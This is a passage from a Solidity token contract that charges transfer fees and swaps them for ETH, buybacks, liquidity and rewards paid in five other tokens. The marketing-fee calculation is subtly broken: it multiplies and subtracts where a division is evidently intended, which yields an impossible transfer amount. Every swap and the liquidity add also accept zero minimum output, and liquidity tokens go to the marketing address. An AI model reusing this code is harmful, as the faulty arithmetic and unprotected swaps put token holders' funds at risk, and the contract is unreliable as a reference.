        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapTokens(uint256 tokenBalance) private lockTheSwap {
        uint256 taxFee = _reflectionFee.add(_buybackFee).add(_marketingFee).add(
            _liquidityFee
        );
        if (taxFee == 0) {
            return;
        }

        uint256 reflectionBalance = tokenBalance.mul(_reflectionFee).div(
            taxFee
        );
        uint256 liquidityBalance = tokenBalance.mul(_liquidityFee).div(taxFee);
        uint256 buybackAndMarketingBalance = tokenBalance
            .sub(reflectionBalance)
            .sub(liquidityBalance);

        // swap token to ether for buyback and marketing
        if (
            buybackAndMarketingBalance > 0 && _marketingFee.add(_buybackFee) > 0
        ) {
            uint256 balanceBefore = address(this).balance;
            swapTokensForEth(buybackAndMarketingBalance);
            uint256 swappedBalance = address(this).balance.sub(balanceBefore);

            //Send marketing fee to the marketing address, buyback fee will be remained in the token contract to buy tokens back later
            uint256 marketingFeeAmount = swappedBalance.mul(_marketingFee).sub(
                _marketingFee.add(_buybackFee)
            );
            if (marketingFeeAmount > 0) {
                transferToAddressETH(_marketingAddress, marketingFeeAmount);
            }
        }

        // add liquidity
        if (liquidityBalance.div(2) > 0) {
            uint256 balanceBefore = address(this).balance;
            swapTokensForEth(liquidityBalance.div(2));
            uint256 swappedBalance = address(this).balance.sub(balanceBefore);
            addLiquidity(liquidityBalance.div(2), swappedBalance);
        }

        // reflect to the holders, distributed by 5 tokens
        if (reflectionBalance.div(5) > 0) {
            swapTokensForTokens(reflectionBalance.div(5), BUSD);
            swapTokensForTokens(reflectionBalance.div(5), EGC);
            swapTokensForTokens(reflectionBalance.div(5), REFLECTO);
            swapTokensForTokens(reflectionBalance.div(5), CRYPT);
            swapTokensForTokens(reflectionBalance.div(5), RMTX);
        }
    }

    function buyBackTokens(uint256 amount) private lockTheSwap {
        if (amount > 0) {
            swapETHForTokens(amount);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        // make the swap
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapTokensForTokens(uint256 tokenAmount, address toTokenAddress)
        private
    {
        // generate the uniswap pair path of token -> toToken
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = toTokenAddress;

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        // make the swap
        IERC20 toToken = IERC20(toTokenAddress);
        uint256 balanceBefore = toToken.balanceOf(address(this));
        _uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of toToken
            path,
            address(this), // The contract
            block.timestamp
        );
        uint256 swappedBalance = toToken.balanceOf(address(this)).sub(
            balanceBefore
        );

        // total rewarded amounts
        RewardInfo storage rewardInfo = _rewardInfo[toTokenAddress];
        rewardInfo.toDistribute = rewardInfo.toDistribute.add(swappedBalance);

        // update reward per share
        rewardInfo.accRewardPerShare = rewardInfo.accRewardPerShare.add(
            swappedBalance.mul(10**(30 - toToken.decimals())).div(totalSupply())
        );

        emit SwapTokensForTokens(tokenAmount, path);
    }

    function swapETHForTokens(uint256 amount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = _uniswapV2Router.WETH();
        path[1] = address(this);

        // make the swap
        _uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: amount
        }(
            0, // accept any amount of Tokens
            path,
            DEAD_ADDRESS, // Burn address
            block.timestamp.add(300)
        );

        emit SwapETHForTokens(amount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        // add the liquidity
        _uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _marketingAddress,
            block.timestamp
        );
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        uint256 feeAmount = 0;
        if (takeFee) {
            uint256 taxFee = _reflectionFee
                .add(_marketingFee)
                .add(_liquidityFee)
                .add(_buybackFee);
            feeAmount = amount.mul(taxFee).div(10000);
        }
        amount = amount.sub(feeAmount);
        if (amount > 0) {
            super._transfer(sender, recipient, amount);
        }
        if (feeAmount > 0) {
            super._transfer(sender, address(this), feeAmount);
        }
    }
}